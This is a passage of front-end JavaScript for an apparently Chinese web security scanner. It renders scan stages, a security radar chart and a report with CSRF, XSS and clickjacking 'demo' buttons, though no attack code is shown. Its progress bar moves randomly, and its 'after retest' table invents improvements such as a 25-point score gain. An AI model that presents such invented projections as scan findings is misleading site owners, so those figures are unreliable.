    '<div style="position:relative;height:160px;margin-bottom:16px;display:flex;align-items:center;justify-content:center">' +
      '<div id="scan-3d-orbit" style="position:relative;width:140px;height:140px">' +
        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.3);animation:spin 3s linear infinite"></div>' +
        '<div style="position:absolute;inset:14px;border-radius:50%;border:2px solid rgba(168,85,247,0.4);animation:spin 2s linear infinite reverse"></div>' +
        '<div style="position:absolute;inset:28px;border-radius:50%;border:2px solid rgba(115,201,144,0.3);animation:spin 4s linear infinite"></div>' +
        // 脉冲波纹
        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(75,110,175,0.4);animation:pulse-ring 2s ease-out infinite"></div>' +
        '<div style="position:absolute;inset:0;border-radius:50%;border:2px solid rgba(168,85,247,0.3);animation:pulse-ring 2s ease-out infinite 0.6s"></div>' +
        '<div id="scan-3d-core" style="position:absolute;inset:42px;border-radius:50%;background:radial-gradient(circle,rgba(75,110,175,0.7),rgba(75,110,175,0.15));display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;box-shadow:0 0 30px rgba(75,110,175,0.5)">' +
          '<span id="scan-percent" style="font-size:26px;font-weight:800;line-height:1">0%</span>' +
          '<span style="font-size:9px;opacity:0.8;margin-top:2px">扫描中</span>' +
        '</div>' +
      '</div>' +
    '</div>' +
    // 进度条
    '<div style="max-width:min(420px,calc(100% - 32px));margin:0 auto 16px">' +
      '<div style="height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden">' +
        '<div id="scan-main-progress" style="height:100%;width:0%;background:#3c3f41;border-radius:3px;transition:width 0.5s ease;box-shadow:0 0 10px rgba(75,110,175,0.5)"></div>' +
      '</div>' +
    '</div>' +
    // 实时检测项滚动
    '<div id="scan-live-text" style="height:20px;font-size:12px;color:#a5b4fc;margin-bottom:14px;text-align:center;overflow:hidden;transition:all 0.3s">' +
      '<span style="display:inline-block;animation:scan-text-glow 1.5s ease-in-out infinite">正在初始化扫描引擎...</span>' +
    '</div>' +
    '<h2 style="margin-bottom:6px;font-size:clamp(16px,5vw,20px)">正在扫描 ' + escapeHtml(host) + '</h2>' +
    '<p style="color:var(--text-lighter);font-size:12px;margin-bottom:18px">安全扫描引擎 · 7 阶段实时扫描中</p>' +
    '<div style="max-width:min(420px,calc(100% - 32px));margin:0 auto;text-align:left">' + stagesHtml + '</div>' +
    '<button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s" onmouseover="this.style.background=\'rgba(199,84,80,0.25)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.15)\'"> 取消扫描</button>' +
    '</div>' +
    '<style>' +
    '@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}' +
    '@keyframes pulse-ring{0%,100%{transform:scale(1);opacity:1}}' +
    '@keyframes scan-text-glow{0%,100%{opacity:1}}' +
    '</style>';
  container.innerHTML = progressHtml;
  // 启动进度动画
  startProgressAnimation();
  let scanDepth = (document.querySelector('input[name="scan-depth"]:checked') || {}).value || 'standard';
  let deepScan = scanDepth === 'deep';
  startRealScan(url, host, deepScan);
}

// ----- updateStage -----
function updateStage(stageId, status) {
  let el = document.getElementById('stage-' + stageId);
  if (!el) return;
  el.style.opacity = '1';
  let icon = el.querySelector('.stage-icon');
  let statusEl = el.querySelector('.stage-status');
  if (status === 'running') {
    el.style.background = 'rgba(75,110,175,0.12)';
    el.style.borderColor = 'rgba(75,110,175,0.4)';
    icon.style.background = 'rgba(75,110,175,0.4)';
    icon.style.color = '#fff';
    icon.innerHTML = '刷新';
    icon.style.animation = 'spin 1s linear infinite';
    statusEl.innerHTML = '<span style="color:#a5b4fc">扫描中</span>';
  } else if (status === 'done') {
    el.style.background = 'rgba(115,201,144,0.1)';
    el.style.borderColor = 'rgba(115,201,144,0.3)';
    icon.style.background = 'rgba(115,201,144,0.3)';
    icon.style.color = '#73c990';
    icon.style.animation = 'none';
    icon.innerHTML = '';
    statusEl.innerHTML = '<span style="color:#73c990">完成</span>';
  } else if (status === 'fail') {
    el.style.background = 'rgba(199,84,80,0.1)';
    el.style.borderColor = 'rgba(199,84,80,0.3)';
    icon.style.background = 'rgba(199,84,80,0.3)';
    icon.style.color = '#c75450';
    icon.style.animation = 'none';
    icon.innerHTML = '';
    statusEl.innerHTML = '<span style="color:#c75450">失败</span>';
  }
}

// ----- animateStages,finishStages -----
function animateStages() {
  let stages = ['dns', 'connect', 'headers', 'ssl', 'sensitive', 'waf', 'report'];
  let i = 0;
  if (_stageTimer) { clearInterval(_stageTimer); _stageTimer = null; }
  function tick() {
    if (i > 0 && i <= stages.length) updateStage(stages[i - 1], 'done');
    if (i < stages.length) {
      updateStage(stages[i], 'running');
      i++;
    } else {
      clearInterval(_stageTimer);
      _stageTimer = null;
    }
  }
  tick();
  _stageTimer = setInterval(tick, 700);
}
function finishStages() {
  if (_stageTimer) { clearInterval(_stageTimer); _stageTimer = null; }
  let stages = ['dns', 'connect', 'headers', 'ssl', 'sensitive', 'waf', 'report'];
  stages.forEach(function(s) { updateStage(s, 'done'); });
  // 进度条完成
  setScanProgress(100, '扫描完成，报告...');
}

// ----- startProgressAnimation -----
function startProgressAnimation() {
  _currentProgress = 0;
  _scanTextIndex = 0;
  if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
  if (_progressTextTimeouts) {
    _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
    _progressTextTimeouts = [];
  }
  let targetProgress = 0;
  _progressTimer = setInterval(function() {
    // 渐进式进度：先快后慢
    if (_currentProgress < 30) {
      targetProgress += Math.random() * 5 + 2;
    } else if (_currentProgress < 60) {
      targetProgress += Math.random() * 3 + 1;
    } else if (_currentProgress < 85) {
      targetProgress += Math.random() * 2 + 0.5;
    } else {
      targetProgress += Math.random() * 0.8 + 0.2;
    }
    targetProgress = Math.min(targetProgress, 95); // 最多到 95%，等真正完成再到 100%
    if (_currentProgress < targetProgress) {
      _currentProgress += (targetProgress - _currentProgress) * 0.3;
      _currentProgress = Math.min(_currentProgress, 95);
    }
    // 更新进度条
    let bar = document.getElementById('scan-main-progress');
    let percentEl = document.getElementById('scan-percent');
    if (bar) bar.style.width = Math.round(_currentProgress) + '%';
    if (percentEl) percentEl.textContent = Math.round(_currentProgress) + '%';
    // 切换检测文字
    if (Math.random() < 0.15 && _scanTextIndex < _scanTexts.length - 1) {
      _scanTextIndex++;
      let textEl = document.getElementById('scan-live-text');
      if (textEl) {
        textEl.style.opacity = '0';
        let tid = setTimeout(function() {
          if (!_progressTimer) return; // 已停止则不更新
          let span = textEl.querySelector('span');
          if (span) span.textContent = _scanTexts[_scanTextIndex];
          textEl.style.opacity = '1';
        }, 200);
        if (!_progressTextTimeouts) _progressTextTimeouts = [];
        _progressTextTimeouts.push(tid);
      }
    }
  }, 200);
}

// ----- stopProgressAnimation -----
function stopProgressAnimation() {
  if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
  if (_progressTextTimeouts) {
    _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
    _progressTextTimeouts = [];
  }
}

// ----- setScanProgress -----
function setScanProgress(percent, text) {
  _currentProgress = percent;
  let bar = document.getElementById('scan-main-progress');
  let percentEl = document.getElementById('scan-percent');
  if (bar) bar.style.width = percent + '%';
  if (percentEl) percentEl.textContent = Math.round(percent) + '%';
  if (text) {
    let textEl = document.getElementById('scan-live-text');
    if (textEl) {
      let span = textEl.querySelector('span');
      if (span) span.textContent = text;
    }
  }
  if (percent >= 100) {
    if (_progressTimer) { clearInterval(_progressTimer); _progressTimer = null; }
    if (_progressTextTimeouts) {
      _progressTextTimeouts.forEach(function(t) { clearTimeout(t); });
      _progressTextTimeouts = [];
    }
  }
}

// ----- buildRadarSvg -----
function buildRadarSvg(data) {
  // 5 个维度评分（0-100）：响应头、SSL、敏感文件、WAF、漏洞检测
  let dims = [
    { name: '安全响应头', score: 0 },
    { name: 'SSL/TLS', score: 0 },
    { name: '敏感文件', score: 0 },
    { name: 'WAF 防护', score: 0 },
    { name: '漏洞检测', score: 0 }
  ];
  // 根据 findings 反推各维度得分
  let findings = data.findings || [];
  findings.forEach(function(f) {
    let n = (f.name || '').toLowerCase();
    let ow = (f.owasp || '').toLowerCase();
    if (n.indexOf('安全响应头') >= 0 || n.indexOf('响应头') >= 0 || ow.indexOf('a05') >= 0) dims[0].score = Math.max(dims[0].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
    if (n.indexOf('https') >= 0 || n.indexOf('ssl') >= 0 || n.indexOf('tls') >= 0 || n.indexOf('证书') >= 0) dims[1].score = Math.max(dims[1].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
    if (n.indexOf('敏感文件') >= 0 || n.indexOf('.env') >= 0 || n.indexOf('.git') >= 0 || n.indexOf('暴露') >= 0) dims[2].score = Math.max(dims[2].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
    if (n.indexOf('waf') >= 0 || n.indexOf('防火墙') >= 0) dims[3].score = Math.max(dims[3].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
    if (n.indexOf('注入') >= 0 || n.indexOf('xss') >= 0 || n.indexOf('sql') >= 0 || n.indexOf('csrf') >= 0) dims[4].score = Math.max(dims[4].score, f.level === '高风险' ? 30 : f.level === '中风险' ? 60 : 80);
  });
  let hasFinding = findings.length > 0;
  dims.forEach(function(d) { if (d.score === 0) d.score = hasFinding ? 85 : 95; });

  // 构造 SVG（5 边形雷达图）
  let cx = 150, cy = 150, r = 110;
  let n = dims.length;
  let points = [];
  let html = '<svg viewBox="0 0 300 300" style="max-width:300px;margin:0 auto;display:block" aria-label="安全维度">';
  for (let g = 1; g <= 5; g++) {
    let rg = r * g / 5;
    let gp = [];
    for (let i = 0; i < n; i++) {
      let a = -Math.PI / 2 + i * 2 * Math.PI / n;
      gp.push((cx + rg * Math.cos(a)).toFixed(1) + ',' + (cy + rg * Math.sin(a)).toFixed(1));
    }
    html += '<polygon points="' + gp.join(' ') + '" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>';
  }
  for (let j = 0; j < n; j++) {
    let a2 = -Math.PI / 2 + j * 2 * Math.PI / n;
    html += '<line x1="' + cx + '" y1="' + cy + '" x2="' + (cx + r * Math.cos(a2)).toFixed(1) + '" y2="' + (cy + r * Math.sin(a2)).toFixed(1) + '" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>';
  }
  let dataPts = [];
  for (let k = 0; k < n; k++) {
    let a3 = -Math.PI / 2 + k * 2 * Math.PI / n;
    let rv = r * dims[k].score / 100;
    dataPts.push((cx + rv * Math.cos(a3)).toFixed(1) + ',' + (cy + rv * Math.sin(a3)).toFixed(1));
    points.push({ x: cx + rv * Math.cos(a3), y: cy + rv * Math.sin(a3), name: dims[k].name, score: dims[k].score });
  }
  html += '<polygon points="' + dataPts.join(' ') + '" fill="rgba(75,110,175,0.35)" stroke="#4b6eaf" stroke-width="2"/>';
  points.forEach(function(p) {
    html += '<circle cx="' + p.x.toFixed(1) + '" cy="' + p.y.toFixed(1) + '" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="1.5"/>';
  });
  points.forEach(function(p, idx) {
    let a4 = -Math.PI / 2 + idx * 2 * Math.PI / n;
    let lx = cx + (r + 22) * Math.cos(a4);
    let ly = cy + (r + 22) * Math.sin(a4);
    let anchor = lx < cx - 5 ? 'end' : lx > cx + 5 ? 'start' : 'middle';
    html += '<text x="' + lx.toFixed(1) + '" y="' + ly.toFixed(1) + '" text-anchor="' + anchor + '" dominant-baseline="middle" font-size="11" font-weight="600" fill="currentColor">' + escapeHtml(p.name) + ' ' + p.score + '</text>';
  });
  html += '</svg>';
  return html;
}

// ----- renderResult -----
function renderResult(data) {
  try {
  // SRC 级报告优先使用新渲染器
  if (isSRCFormat(data)) {
    initResultPage();
    navigateTo('result');
    renderSRCResult(data);
    lastScanResult = data;
    saveScanHistory(data);
    return;
  }
  // 防御性兜底：确保 data 及核心字段存在
  data = data || {};
  // 严格类型校验：确保数组字段是真正的数组
  data.findings = Array.isArray(data.findings) ? data.findings : [];
  data.owasp_coverage = Array.isArray(data.owasp_coverage) ? data.owasp_coverage : [];
  data.header_details = Array.isArray(data.header_details) ? data.header_details : [];
  data.info_leaks = Array.isArray(data.info_leaks) ? data.info_leaks : [];
  data.cookie_issues = Array.isArray(data.cookie_issues) ? data.cookie_issues : [];
  data.waf = Array.isArray(data.waf) ? data.waf : [];
  data.sensitive_paths = Array.isArray(data.sensitive_paths) ? data.sensitive_paths : [];
  data.crawled_pages = Array.isArray(data.crawled_pages) ? data.crawled_pages : [];
  data.vuln_tests = Array.isArray(data.vuln_tests) ? data.vuln_tests : [];
  data.score_breakdown = Array.isArray(data.score_breakdown) ? data.score_breakdown : [];
  data.owasp_coverage = Array.isArray(data.owasp_coverage) ? data.owasp_coverage : [];
  // 确保 ai_report 是对象
  data.ai_report = (data.ai_report && typeof data.ai_report === 'object') ? data.ai_report : { summary: '扫描完成', priority: '暂无优先事项' };
  // 确保 score 是有效数字
  data.score = typeof data.score === 'number' ? data.score : (parseInt(data.score, 10) || 0);
  data.score = Math.max(0, Math.min(100, data.score));
  // 确保 raw_headers 是对象
  data.raw_headers = (data.raw_headers && typeof data.raw_headers === 'object') ? data.raw_headers : {};
  let highCount = 0, medCount = 0, lowCount = 0;
  data.findings.forEach(function(f) {
    if (f.level === '高风险') highCount++;
    else if (f.level === '中风险') medCount++;
    else lowCount++;
  });

  let riskClass = data.score < 50 ? 'high' : data.score < 75 ? 'medium' : 'low';
  let gradient = getScoreGradient(data.score);
  let scoreColor = getScoreColor(data.score);

  let html = '';

  // 报告 Header
  html += '<div class="report-header fade-in-up">';
  html += '<div style="margin-bottom:12px">';
  if (data.restricted) {
    html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">受限扫描报告</span>';
  } else {
    html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">真实扫描</span>';
  }
  html += '</div>';
  // TLS 验证跳过警告
  if (data.tls_verify_skipped) {
    html += '<div style="background:rgba(199,84,80,0.08);border:1px solid rgba(199,84,80,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#c75450;line-height:1.6">';
    html += '<strong>诊断模式</strong><br/>';
    html += '当前扫描跳过了 TLS 证书验证，结果仅供诊断参考。生产环境建议开启 TLS_VERIFY=true。';
    html += '</div>';
  }
  // 受限扫描专业提示
  if (data.restricted) {
    html += '<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">';
    html += '<strong>受限扫描报告</strong><br/>';
    html += '目标可访问，但存在登录/WAF/反爬限制（HTTP ' + (data.restricted_code || '') + '），<br/>';
    html += '本次扫描受到登录态、WAF 或反爬限制影响，部分结果仅供复核参考。';
    html += '</div>';
  } else if (data.restricted_reason) {
    html += '<div style="background:rgba(240,167,50,0.08);border:1px solid rgba(240,167,50,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#f0a732;line-height:1.6">';
    html += '<strong>受限访问提示</strong><br/>' + escapeHtml(data.restricted_reason);
    html += '</div>';
  }
  // 跳转提示（蓝色信息提示，区别于黄色的受限扫描）
  if (data.redirected) {
    html += '<div style="background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.2);border-radius:2px;padding:12px 16px;margin-bottom:16px;text-align:left;font-size:13px;color:#4b6eaf;line-height:1.6">';
    html += '<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">';
    html += '<div><strong>跳转提示</strong><br/>';
    html += escapeHtml(data.redirect_reason || '目标发生跳转，建议扫描最终目标地址。');
    html += '</div>';
    html += '<button onclick="scanRedirectTarget()" style="background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;transition:background 0.15s" onmouseover="this.style.background=\'rgba(59,130,246,0.25)\'" onmouseout="this.style.background=\'rgba(59,130,246,0.15)\'">扫描最终地址</button>';
    html += '</div></div>';
  }
  html += '<div class="score-ring-wrap score-pulse">';
  html += '<div class="score-ring" style="background:' + gradient + '">';
  html += '<div class="score-value" style="color:#fff">' + data.score + '</div>';
  html += '<div class="score-label" style="color:rgba(255,255,255,0.7)">安全评分</div>';
  html += '</div></div>';
  html += '<div class="report-url">' + escapeHtml(data.url || '') + '</div>';
  html += '<div class="report-time">' + (data.time || '') + '</div>';
  html += '<span class="risk-badge ' + riskClass + '">' + (data.risk_level || '未知') + '</span>';
  html += '</div>';

  let managementSummary = '';
  if (highCount + medCount > 0) {
    managementSummary = '当前结果包含 ' + highCount + ' 个高风险和 ' + medCount + ' 个中风险项，建议先修复高风险项，再复测确认。';
  } else if (lowCount > 0) {
    managementSummary = '当前风险以低危和提示项为主，建议保持修复节奏并持续监控。';
  } else {
    managementSummary = '当前未发现明显风险，可作为基线结果保留，并在版本变更后复测。';
  }
  html += '<div class="card fade-in-up" style="animation-delay:0.05s;padding:14px;margin-top:12px;border:1px solid rgba(75,110,175,0.25);background:rgba(60,63,65,0.9)">';
  html += '<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:6px">';
  html += '<div style="font-size:13px;font-weight:700;color:var(--text-primary)">概览</div>';
  html += '<div style="font-size:12px;color:var(--text-secondary)">' + (data.restricted ? '受限扫描，结论需复核' : '可直接进入修复与复测') + '</div>';
  html += '</div>';
  html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">' + escapeHtml(managementSummary) + '</div>';

  html += '<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:12px;color:var(--text-secondary)">';

  html += '<span>总发现：' + (data.findings.length || 0) + '</span>';
  html += '<span>高/中风险：' + highCount + '/' + medCount + '</span>';
  html += '<span>最近评分：' + data.score + '</span>';
  html += '</div>';
  html += '</div>';

  // Risk Stats
  html += '<div class="risk-stats fade-in-up" style="animation-delay:0.1s">';
  html += '<div class="risk-stat high"><div class="num">' + highCount + '</div><div class="label">高风险</div></div>';
  html += '<div class="risk-stat medium"><div class="num">' + medCount + '</div><div class="label">中风险</div></div>';
  html += '<div class="risk-stat low"><div class="num">' + lowCount + '</div><div class="label">低风险</div></div>';
  html += '</div>';

  // 雷达图：5 个 OWASP 维度得分
  html += '<div class="card fade-in-up" style="animation-delay:0.15s">';
  html += '<div class="card-title">安全维度</div>';
  html += '<div id="radar-chart-container" style="display:flex;justify-content:center"></div>';
  html += '</div>';

  // 演示按钮
  html += '<div class="card fade-in-up" style="animation-delay:0.2s">';
  html += '<div class="card-title">演示</div>';
  html += '<p style="margin:0 0 14px 0;font-size:12px;color:var(--text-secondary)">展示常见风险场景，用于说明问题影响</p>';
  html += '<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px">';
  html += '<button onclick="simulateCSRF(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(199,84,80,0.3);background:rgba(199,84,80,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#dc2626;transition:background 0.15s" onmouseover="this.style.background=\'rgba(199,84,80,0.15)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.08)\'">';
  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">CSRF</div>';
  html += '<div style="font-size:11px;font-weight:400;color:#7f1d1d">跨站请求伪造</div></button>';
  html += '<button onclick="simulateXSS(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(240,167,50,0.3);background:rgba(240,167,50,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#ea580c;transition:background 0.15s" onmouseover="this.style.background=\'rgba(240,167,50,0.15)\'" onmouseout="this.style.background=\'rgba(240,167,50,0.08)\'">';
  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">XSS</div>';
  html += '<div style="font-size:11px;font-weight:400;color:#f0a732">跨站脚本</div></button>';
  html += '<button onclick="simulateClickjacking(\'' + escapeAttr(data.url) + '\')" style="padding:10px 8px;border:1px solid rgba(168,85,247,0.3);background:rgba(168,85,247,0.08);border-radius:2px;cursor:pointer;font-size:12px;font-weight:600;color:#9333ea;transition:background 0.15s" onmouseover="this.style.background=\'rgba(168,85,247,0.15)\'" onmouseout="this.style.background=\'rgba(168,85,247,0.08)\'">';
  html += '<div style="font-size:13px;font-weight:600;color:var(--text-primary)">Clickjacking</div>';
  html += '<div style="font-size:11px;font-weight:400;color:#c084fc">点击劫持</div></button>';
  html += '</div>';
  html += '<div id="attack-演示-result" style="margin-top:14px"></div>';
  html += '</div>';

  //  评分解读（专业版）
  if (data.score_breakdown && data.score_breakdown.length > 0) {
    let totalDeduction = data.score_breakdown.reduce(function(s,b) { return s + b.deduction; }, 0);
    
    // 按严重程度分组
    let criticalDeduct = 0, highDeduct = 0, medDeduct = 0, lowDeduct = 0;
    let criticalItems = [], highItems = [], medItems = [], lowItems = [];
    data.score_breakdown.forEach(function(b) {
      if (b.severity === 'critical') { criticalDeduct += b.deduction; criticalItems.push(b); }
      else if (b.severity === 'high') { highDeduct += b.deduction; highItems.push(b); }
      else if (b.severity === 'medium') { medDeduct += b.deduction; medItems.push(b); }
      else { lowDeduct += b.deduction; lowItems.push(b); }
    });
    
    html += '<div class="card fade-in-up" style="animation-delay:0.25s">';
    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">';
    html += '<div style="display:flex;align-items:center;gap:10px">';
    html += '<div class="card-title" style="margin:0">评分解读</div>';
    html += '</div>';
    html += '<span style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 ' + totalDeduction + ' 分</span>';
    html += '</div>';
    
    // 扣分分布条形图
    html += '<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';
    let maxDeduct = Math.max(criticalDeduct, highDeduct, medDeduct, lowDeduct, 1);
    let barGroups = [
      { label: '严重', count: criticalItems.length, deduct: criticalDeduct, color: '#dc2626', bg: 'rgba(220,38,38,0.15)' },
      { label: '高风险', count: highItems.length, deduct: highDeduct, color: '#f0a732', bg: 'rgba(240,167,50,0.15)' },
      { label: '中风险', count: medItems.length, deduct: medDeduct, color: '#f0a732', bg: 'rgba(240,167,50,0.15)' },
      { label: '低风险', count: lowItems.length, deduct: lowDeduct, color: '#73c990', bg: 'rgba(115,201,144,0.15)' },
    ];
    barGroups.forEach(function(g) {
      let width = g.count > 0 ? Math.max((g.deduct / maxDeduct) * 100, 8) : 0;
      html += '<div style="display:flex;align-items:center;gap:10px">';
      html += '<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">' + g.label + '</span>';
      html += '<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">';
      html += '<div style="height:100%;width:' + width + '%;background:' + g.color + ';border-radius:2px;transition:width 0.6s ease"></div>';
      html += '<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:' + (width > 30 ? '#fff' : 'var(--text-secondary)') + '">' + g.count + ' 项 / -' + g.deduct + '分</span>';
      html += '</div></div>';
    });
    html += '</div>';
    
    // 修复优先级建议
    html += '<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">';
    html += '<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">';
    html += '<span>修复优先级建议</span>';
    html += '</div>';
    let priorityTips = [];
    if (criticalItems.length > 0) priorityTips.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（' + criticalItems.length + '项）');
    if (highItems.length > 0) priorityTips.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（' + highItems.length + '项）');
    if (medItems.length > 0) priorityTips.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（' + medItems.length + '项）');
    if (lowItems.length > 0) priorityTips.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（' + lowItems.length + '项）');
    if (priorityTips.length === 0) priorityTips.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题');
    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">' + priorityTips.join('<br/>') + '</div>';
    html += '</div>';
    
    // 展开详细扣分明细
    html += '<details style="margin-top:12px">';
    html += '<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">';
    html += '<span style="display:inline-flex;align-items:center;gap:6px">';
    html += '<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>';
    html += '查看完整扣分明细';
    html += '</span></summary>';
    html += '<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">';
    let allItems = criticalItems.concat(highItems, medItems, lowItems);
    allItems.forEach(function(b, idx) {
      let sevColor = b.severity === 'critical' ? '#dc2626' : b.severity === 'high' ? '#f0a732' : b.severity === 'medium' ? '#ca8a04' : '#16a34a';
      let sevLabel = b.severity === 'critical' ? '严重' : b.severity === 'high' ? '高' : b.severity === 'medium' ? '中' : '低';
      html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">';
      html += '<div style="display:flex;align-items:center;gap:8px">';
      html += '<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:' + sevColor + '20;color:' + sevColor + '">' + sevLabel + '</span>';
      html += '<span style="color:var(--text-primary)">' + escapeHtml(b.item) + '</span>';
      html += '</div>';
      html += '<span style="font-weight:700;color:' + sevColor + '">- ' + b.deduction + '</span>';
      html += '</div>';
    });
    html += '</div></details>';

    html += '</div>';
  }

  //  复测前后价值对比
  let _valBefore评分 = data.score || 0;
  let _valAfter评分  = Math.min(98, _valBefore评分 + 25);
  let _valBeforeRisk  = highCount + medCount;
  let _valAfterRisk   = Math.max(0, Math.round(_valBeforeRisk * 0.25));
  let _valBeforeHdr   = 0;
  let _valAfterHdr    = 0;
  let _valBeforePath  = 0;
  let _valAfterPath   = 0;
  if (data.findings) {
    data.findings.forEach(function(f) {
      let fn = f.name || '';
      if (fn.indexOf('缺少') >= 0 && fn.indexOf('头') >= 0) _valBeforeHdr++;
      if (fn.indexOf('敏感路径') >= 0 || fn.indexOf('目录遍历') >= 0 || fn.indexOf('.env') >= 0) _valBeforePath++;
    });
    _valAfterHdr  = 0;
    _valAfterPath = Math.max(0, _valBeforePath - 2);
  }
  html += '<div class="card fade-in-up" style="animation-delay:0.18s">';
  html += '<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">';
  html += '<div class="card-title" style="margin:0">复测前后对比</div>';
  html += '<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>';
  html += '</div>';
  html += '<div style="overflow-x:auto">';
  html += '<table style="width:100%;border-collapse:collapse;font-size:13px">';
  html += '<thead><tr style="border-bottom:1px solid #555555">';
  html += '<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>';
  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测前</th>';
  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测后</th>';
  html += '<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>';
  html += '</tr></thead>';
  html += '<tbody>';
  let _rows = [
    { label: '安全评分', before: _valBefore评分, after: _valAfter评分, unit: '分', good: 'up' },
    { label: '中高风险', before: _valBeforeRisk, after: _valAfterRisk, unit: '个', good: 'down' },
    { label: '缺失安全头', before: _valBeforeHdr, after: _valAfterHdr, unit: '个', good: 'down' },
    { label: '敏感路径风险', before: _valBeforePath, after: _valAfterPath, unit: '个', good: 'down' },
    { label: '建议处理时间', before: '2 小时', after: '15 分钟', unit: '', good: 'down' },
  ];
  _rows.forEach(function(r, idx) {
    let _delta = '';
    if (typeof r.before === 'number' && typeof r.after === 'number') {
      let _d = r.after - r.before;
      let _dc = _d > 0 ? '#16a34a' : _d < 0 ? '#dc2626' : 'var(--text-secondary)';
      let _ds = _d > 0 ? '+' + _d : String(_d);
      _delta = '<span style="color:' + _dc + ';font-weight:700">' + _ds + '</span>';
    } else {
      _delta = '<span style="color:#16a34a;font-weight:700">大幅缩短</span>';
    }
    let _bg = idx % 2 === 0 ? 'transparent' : '#313335';
    html += '<tr style="background:' + _bg + ';border-bottom:1px solid #555555">';
    html += '<td style="padding:10px 8px;font-weight:600">' + r.label + '</td>';
    html += '<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">' + r.before + (r.unit ? ' ' + r.unit : '') + '</td>';
    html += '<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">' + r.after + (r.unit ? ' ' + r.unit : '') + '</td>';
    html += '<td style="text-align:center;padding:10px 8px">' + _delta + '</td>';
    html += '</tr>';
  });
  html += '</tbody></table>';
  html += '</div>';
